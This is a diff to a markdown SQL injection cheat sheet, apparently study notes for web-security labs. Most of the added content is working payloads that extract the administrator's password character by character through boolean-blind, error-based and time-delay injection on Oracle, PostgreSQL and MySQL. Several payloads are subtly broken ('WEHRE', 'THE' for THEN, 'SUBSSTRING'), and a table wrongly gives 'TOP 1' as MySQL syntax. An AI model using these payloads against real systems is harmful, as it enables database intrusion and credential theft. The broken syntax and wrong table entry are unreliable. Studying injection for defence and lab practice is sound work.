@@ -16,6 +16,12 @@ Comments can truncate the rest of the original query.
 | MySQL      | `#comment`, `-- comment` (note the space), `/*comment*/` |
 | SQLite     | `--comment`, `/*comment*/`                               |
 
+Example:
+
+```sql
+' AND 1=1-'
+```
+
 ---
 
 ## 🔗 String Concatenation
@@ -30,6 +36,12 @@ Concatenate literals:
 | MySQL      | `'foo' 'bar'` (note the space) or `CONCAT('foo', 'bar')` |
 | SQLite     | `'foo' \|\| 'bar'`                                       |
 
+Example (Oracle expression injection):
+
+```sql
+' || (SELECT 1 FROM dual) || '
+```
+
 ---
 
 ## 📏 Length and Substring
@@ -41,6 +53,12 @@ Concatenate literals:
 | MSSQL      | `SUBSTRING(col, off, len)` | `LEN(col)`       |
 | MySQL      | `SUBSTRING(col, off, len)` | `LENGTH(col)`    |
 | SQLite     | `SUBSTR(col, off, len)`    | `LENGTH(col)`    |
+
+ASCII extraction:
+
+```sql
+ASCII(SUBSTR(password, 1, 1))
+```
 
 ---
 
@@ -108,7 +126,56 @@ Example:
 
 Use `LENGTH()` or `SUBSSTRING()` logic to extract text via True/False response.
 
+Extract first character:
+
+```sql
+' AND (SELECT SUBSTR(password, 1, 1)
+    FROM users
+    WHERE username='administrator'
+    AND ROWNUM=1)='a'--
+```
+
+ASCII Comparison:
+
+```
+' AND (SELECT ASCII(SUBSTR(password, 1, 1))
+    FROM users
+    WEHRE username='administrator'
+    AND ROWNUM=1)>100--
+```
+
 ---
+
+## 🔎 Boolean Wrapping
+
+When injecting `SELECT` into boolean context:
+
+Use:
+
+```sql
+AND EXISTS(SELECT 1 FROM users WEHRE condition)
+```
+
+OR
+
+```sql
+AND (SELECT count(*) FROM users WHERE condition)>0
+```
+
+OR
+
+```sql
+AND (SELECT CASE WHEN condition THEN 1 ELSE 0 END)=1
+```
+
+OR NULL check:
+
+```sql
+AND (SELECT SUBSTR(password,1,1)
+    FROM users
+    WEHRE username='administrator'
+    AND ROWNUM=1) IS NOT NULL
+```
 
 ## 💥 Error-Based SQLi
 
@@ -124,12 +191,19 @@ Conditional error:
 
 ```sql
 ' AND (SELECT CASE WHEN (condition) THEN 1/0 ELSE NULL END FROM dual)--'
+
+OR
+
+' AND (SELECT 1/0 FROM dual WHERE condition)--'
 ```
 
 Type conversion error:
 
 ```sql
-' AND 1=CAST((SELECT password from users WHERE username='administrator' AND ROWNUM=1) AS INT)--
+' AND 1=CAST((SELECT password
+                from users
+                WHERE username='administrator'
+                AND ROWNUM=1) AS INT)--
 ```
 
 Common Oracle errors:
@@ -140,19 +214,19 @@ Common Oracle errors:
 **PostgreSQL**
 
 ```sql
-1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
+1 = (SELECT CASE WHEN (condition) THEN 1/(SELECT 0) ELSE NULL END)
 ```
 
 **MSSQL**
 
 ```sql
-SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+SELECT CASE WHEN (condition) THEN 1/0 ELSE NULL END
 ```
 
 **MySQL**
 
 ```sql
-SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+SELECT IF(condition,(SELECT table_name FROM information_schema.tables),'a')
 ```
 
 ## Union-Based SQLi
@@ -203,6 +277,28 @@ Force delay to infer True/False:
 | MySQL      | `SELECT SLEEP(10)`                        |
 | SQLite     | `SELECT RANDOMBLOB(1);` (no native sleep) |
 
+**Oracle Conditional**
+
+```sql
+' AND CASE WHEN condition
+        THE dbms_pipe.receive_message(('a'), 10)
+        ELSE NULL END IS NULL--
+```
+
+**PostgreSQL Conditional**
+
+```sql
+' AND (SELECT CASE WHEN condition
+        THEN pg_sleep(10)
+        ELSE pg_sleep(0) END IS NULL)--
+```
+
+**MySQL Conditional**
+
+```sql
+SELECT IF(condition, SLEEP(10), 0)
+```
+
 ---
 
 ## 📌 Notes on ORACLE
@@ -222,22 +318,28 @@ UNION SELECT 'abc' FROM dual --
 
 To limit number of rows returned in query result:
 
-```sql
--- Oracle
-AND ROWNUM = 1
-AND FETCH FIRST n ROWS
+| Engine         | Syntax               |
+| -------------- | -------------------- |
+| Oracle         | `ROWNUM=1`           |
+| Oracle (newer) | `FETCH FIRST n ROWS` |
+| PostgreSQL     | `LIMIT 1`            |
+| MySQL          | `TOP 1`              |
+| MySQL          | `LIMIT 1`            |
+| SQLite         | `LIMIT 1`            |
 
--- PostgreSQL
-LIMIT 1
+---
 
--- MSSQL
-TOP 1
+## 🧠 Important Concepts
 
--- MySQL
-LIMIT 1
+**SQL Execution Order**
 
--- SQLite
-LIMIT 1
+```
+FROM
+WHERE
+GROUP BY
+HAVING
+SELECT
+ORDER BY
 ```
 
 ---
